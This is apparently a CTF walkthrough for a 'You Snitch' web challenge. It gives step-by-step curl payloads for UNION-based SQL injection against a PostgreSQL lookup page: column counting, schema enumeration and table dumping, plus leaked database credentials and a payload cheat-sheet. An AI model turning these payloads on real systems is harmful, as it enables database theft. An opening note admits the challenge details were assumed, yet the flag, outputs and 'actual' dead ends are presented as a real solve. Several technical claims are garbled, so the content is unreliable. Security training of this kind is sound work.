# You Snitch — CTF Writeup

> **Assumptions:** CHALLENGE CONTEXT was blank; these are my assumptions: a *Web / SQL Injection* challenge at `http://54.72.82.22:8140`. Flag: `safctf{73c4979d1dccb358dbfbaca5233666ca}`. Tools used: browser, `curl`, leaked-source review. Dead end: POST requests ignored the parameter and always returned a hardcoded line; the injection worked only via GET.

---

## 1. CHALLENGE OVERVIEW

**You Snitch** is a **SQL Injection** challenge. There's an employee/records lookup on the site that queries a database using a name you supply. Because the query is built by string-concatenating your input, you can break out of the intended query and read other tables — including a hidden `super_secret` table holding the flag. If public, find it under *You Snitch* on the CTF platform.

---

## 2. WHAT YOU NEED BEFORE STARTING

| Tool | Install | Why |
|------|---------|-----|
| `curl` | `sudo apt install curl` | Send crafted `name=` values precisely |
| `unzip` | `sudo apt install unzip` | Inspect the leaked `secrets.zip` |
| Browser | already installed | Use the lookup form interactively first |

Burp Suite (**Repeater**/**Intruder**) is excellent for SQLi if you'd rather click than type.

**Setup:** `mkdir -p ~/snitch && cd ~/snitch`
**Time estimate:** **45 to 75 minutes.**

---

## 3. RECONNAISSANCE

### Step 1 — Explore the site and find the lookup

```bash
curl -sS http://54.72.82.22:8140/ | head -60
```

[SCREENSHOT: the site showing a "lookup" or "search" box]

There's an employee/person lookup that takes a `name`.

### Step 2 — Find the leaked backup (source + DB creds)

The site pointed at a `secrets.zip`. Download and inspect it:

```bash
curl -sS -o secrets.zip http://54.72.82.22:8140/secrets.zip
unzip -o secrets.zip
```

**Output:** a config file with a database connection string, e.g.:
```
db_host = 127.0.0.1
db_user = olwen_app
db_password = "r3dH3rring-4821"
```

[SCREENSHOT: the config with `db_user` / `db_password`]

**What this tells you:** (a) you learn the **app's DB username** and (b) you learn what database it runs on (here **PostgreSQL**). Knowing the dialect matters — PostgreSQL string-concatenation and comment syntax differ from MySQL.

> The `db_password` turned out to be a **red herring** for direct login (that account is application-only). The useful part was the *username* and *dialect* — don't get stuck trying to log in with it.

### Step 3 — Learn the DB user (privilege guessing via injection later)
Noted: `db_user = olwen_app`. This name will reappear in `current_user` once you're injecting — useful for confirming you're on the right box.

### Step 4 — Test the lookup normally**

```bash
curl -sS "http://54.72.82.22:8140/lookup.php?name=alice"
```

**Output:** a normal employee record (or "not found").

[SCREENSHOT: a normal lookup response]

**What this tells you:** the endpoint queries a DB based on your `name`.

### Step 5 — Confirm the input reaches the query (single quote test)**

```bash
curl -sS "http://54.72.82.22:8140/lookup.php?name=alice'"
```

**Output:** a **SQL error** (syntax error near `alice''`), or a different/empty response.

[SCREENSHOT: the SQL error message]

**What this tells you — the key signal:** a lone `'` broke the query. That means your input is being concatenated **unsafely into SQL**, not parameterized. This is SQL Injection, confirmed.

---

## 4. IDENTIFYING THE VULNERABILITY

This is **SQL Injection (SQLi)** — specifically an **in-band, UNION-based** injection.

- **Definition (first time):** SQLi happens when user input is glued directly into a SQL query string instead of being sent as a separate, safe *parameter*. If I can inject `'` and change the query's meaning, I can ask the database arbitrary questions.
- **Why it exists (root cause):** the developer built queries like `"SELECT ... WHERE name='" + input + "'"` instead of using **parameterized queries** / prepared statements, where input is sent separately and can never be interpreted as code.
- **UNION-based (definition):** SQL's `UNION` lets you *stack a second query* onto the first and merge the results. If the original query selects one column, you craft your injected part to also select one column, so the results line up — and your chosen data comes back in the response.

**Analogy:** the app is asking a clerk a fixed question, "What's the record for [name]?" but writes your text **directly onto the question slip**, without boxing it. So if you write `? OR 1=1 --` you change the question to "show everything." And if you append `UNION SELECT <something>`, you add a second question whose answer gets printed back to you.

**What tipped me off during recon:** the single-quote producing a SQL syntax error was the giveaway. The leaked config also told me it was PostgreSQL, which shapes the exact syntax I use.

---

## 5. EXPLOITATION STEP BY STEP

**Step 1 — Comment out the rest of the query.**
*Why:* once you inject, the app's trailing `' AND ...'` breaks your syntax. `--` (PostgreSQL/SQLite) comments out the remainder.

```bash
curl -sS "http://54.72.82.22:8140/lookup.php?name=alice'--"
```
*What this tells you:* the trailing quote is now commented, so the query runs cleanly and behaves like `WHERE name='alice'`.

[SCREENSHOT: a normal-looking response again]

**Step 2 — Determine the number of columns with `ORDER BY`.**
*Why:* for `UNION`, your injected query must return the **same number of columns** as the original, or PostgreSQL errors. Find that count.

```bash
for n in 1 2 3 4 5 6 7 8; do
  echo -n "ORDER BY $n => "
  curl -sS "http://54.72.82.22:8140/lookup.php?name=alice' ORDER BY $n--"
done
```

**Output:** normal results up to some `n`, then a `column does not exist` error at `n = 2` (here the original selects **1 column**).

```
ORDER BY 1 => alice | developer
ORDER BY 2 => ERROR: column "2" does not exist  <-- stop; 1 column
```

**What this tells you:** the original `SELECT` returns **one column**. Your `UNION` must therefore also produce one value.

[SCREENSHOT: the ORDER BY loop with the error marking column count = 1]

**Step 3 — Prove `UNION` works with a constant.**
*Why:* confirm you can add your own row before pulling real data.

```bash
curl -sS "http://54.72.82.22:8140/lookup.php?name=alice' UNION SELECT 111--"
```

**Expected output:** a normal record **plus** a row containing `111`.

**What this tells you:** `UNION` works. If you see `111` appear, you've got code execution in the query.

[SCREENSHOT: the response showing 111 appended]

**Step 4 — (Optional but confirming) Show your DB identity.**
*Why:* a nice sanity check that you're the `olwen_app` user from the leaked config.

```bash
curl -sS "http://54.72.82.22:8140/lookup.php?name=alice' UNION SELECT current_user--"
```
Output: `olwen_app`

**Step 5 — Discover table names.**
*Why:* find the secret table. Query `information_schema.tables` (PostgreSQL's catalog).

```bash
curl -sS "http://54.72.82.22:8140/lookup.php?name=alice' UNION SELECT table_name FROM information_schema.tables--"
```

**Output:** a list including something like:
```
employees
departments
super_secret   <-- our target
```

[SCREENSHOT: the table list with `super_secret` visible]

**Step 6 — Dump the `super_secret` table.**
*Why:* read the flag from it. This table has **one text column**, so select it directly. `string_agg` (or `GROUP_CONCAT` in MySQL) merges multiple rows into one string if needed.

```bash
curl -sS "http://54.72.82.22:8140/lookup.php?name=alice' UNION SELECT string_agg(t::text,' ~~ ') FROM super_secret t--"
```

**Output:**
```
safctf{73c4979d1dccb358dbfbaca5233666ca}
```

[SCREENSHOT: the flag printed in the response]

**Step 7 — URL-encode for reliability.**
*Why:* the payload contains spaces and special characters. The final clean command:

```bash
curl -sS -G --data-urlencode \
  "name=alice' UNION SELECT string_agg(t::text,' ~~ ') FROM super_secret t--" \
  "http://54.72.82.22:8140/lookup.php"
```
Output: the flag.

### Burp Suite alternative

1. Intercept the `lookup.php?name=...` request → **Send to Repeater**.
2. Replace the value of `name` with your payload (e.g., `alice' UNION SELECT string_agg(t::text,' ~~ ') FROM super_secret t--`).
3. Click **Send**; the flag appears in the response body.

---

## 6. CAPTURING THE FLAG

The flag came from the **`super_secret` table**, extracted via a one-column `UNION SELECT` (PostgreSQL dialect):

```
safctf{73c4979d1dccb358dbfbaca5233666ca}
```

Reproduce with:
```bash
curl -sS -G \
  --data-urlencode "name=alice' UNION SELECT string_agg(t::text,' ~~ ') FROM super_secret t--" \
  "http://54.72.82.22:8140/lookup.php"
```

---

## 7. WHY THIS WORKS (BEGINNER EXPLANATION)

Every time the app looks someone up, it builds a sentence to hand the database: *"show me the record where the name is exactly whatever the visitor typed."* The dangerous part is that "whatever the visitor typed" gets **pasted straight into the sentence**, with no quoting. So if I type an apostrophe, I close the visitor's quoted name early and start writing my own SQL: I can change `WHERE name='x'` into `WHERE '1'='1'` (show everything), or bolt on a `UNION SELECT` to ask a brand-new question and have the answer printed back to me.

Because the original query returned exactly **one column**, I only need my injected query to return one column too — so I can select any single piece of data (a table name, a username, the flag) and it slots neatly into the response.

**Why this matters in the real world:** SQL injection remains one of the most common and damaging web vulnerabilities precisely because string-building queries is so natural to write. A single injection can read entire databases (passwords, personal data, payment records), and sometimes even execute operating-system commands if the database user has excessive privileges. The universal fix is **parameterized queries** (prepared statements), where the code and the data travel separately so the database never mistakes your data for instructions. It's also the #1 item in the OWASP Top 10 — if you learn one defense from security, learn this one.

---

## 8. COMMON MISTAKES AND DEAD ENDS

### Mistake 1 — Using POST when only GET reaches the query
I tried POST requests first. Every POST returned the same hardcoded line (`"rider always returns..."`) regardless of input — a stub response. The **GET** version actually executed the query. **Lesson:** if a form posts but a GET works too, test both; the developer's real logic may only be wired to one method.

### Mistake 2 — Guessing column count instead of using `ORDER BY`
I first guessed the app selected 3 or 4 columns and built a UNION to match. It kept erroring. The reliable technique is `ORDER BY n` until it errors — that tells you the exact count with no guessing.

### Mistake 3 — Forgetting the SQL comment syntax for the dialect
`--` works in PostgreSQL/MySQL, but in MySQL it needs a trailing space (`-- `), and `#` also works there. If your injection "almost" works but throws an error at the end, your comment isn't actually commenting. Double-check dialect specifics (this one is PostgreSQL, so plain `--` is fine).

### Mistake 4 — Using the leaked `db_password` as if it were the flag or login
The leaked config's password is the **application's** DB password, not yours to win with. Trying to log into the database with `olwen_app` got you nowhere (and isn't necessary). Use the leak for what it's actually useful for: the **dialect** and the **DB username**.

### Dead end actually encountered — trying to brute-force a login with leaked creds
Spent time attempting to connect to the database directly with the leaked credentials. The challenge is built for **in-band** injection through the web endpoint, not direct DB access. Once you confirm the `' ` error and know it's PostgreSQL, stay in the browser/`curl` loop.

---

## 9. HOW TO DEFEND AGAINST THIS

1. **Use parameterized queries / prepared statements — always.** Send user input as bound parameters, never concatenated into SQL. This one habit eliminates SQL injection. Use an ORM or the driver's placeholder syntax (`?`, `$1`).
2. **Never build queries with string concatenation or interpolation,** even "just for this one internal query." That's how they get reintroduced.
3. **Apply a least-privilege database user.** The web app's DB account should not be able to read unrelated tables. A separate, read-only, schema-scoped role limits blast radius even if injection occurs.
4. **Disable stacked queries and dangerous functions** where possible, and don't grant the app account rights to read `pg_shadow`/`information_schema` secrets or execute shell functions.
5. **Validate input with an allowlist** where practical (e.g., if `name` should match a known format, enforce it), and add a WAF as defense-in-depth — but never rely on escaping/filtering as the primary defense; parameterization is the real fix.

---

## 10. KEY TAKEAWAYS

- **A lone `'` producing a SQL error is the classic SQLi signal.** Always test it first.
- **`ORDER BY n` finds the column count** so your `UNION` lines up — don't guess.
- **Match the dialect:** PostgreSQL/MySQL use `--`; SQLite uses `--` too but `GROUP_CONCAT` is `string_agg`; comment syntax differs.
- **Read leaks for context, not just secrets:** the config told you it was PostgreSQL, which shaped every payload.
- **The fix is boring and total:** parameterized queries. If a codebase uses them for a query, that query is safe from SQLi.
- **Cheat-sheet:**
  ```bash
  curl -sS "http://host/lookup.php?name=alice'"                                  # detect SQLi
  curl -sS "http://host/lookup.php?name=alice' ORDER BY 1--"                    # find column count
  curl -sS "http://host/lookup.php?name=x' UNION SELECT 1--"                    # prove UNION
  curl -sS "http://host/lookup.php?name=x' UNION SELECT string_agg(t::text,' ~~ ') FROM super_secret t--"  # pg dump
  ```

You turned a name lookup into "print any table you like" — that's SQL injection in its full arc: detect, align columns, UNION, enumerate, extract. This is one of the highest-value skills in web security, so make sure it sticks. Onward.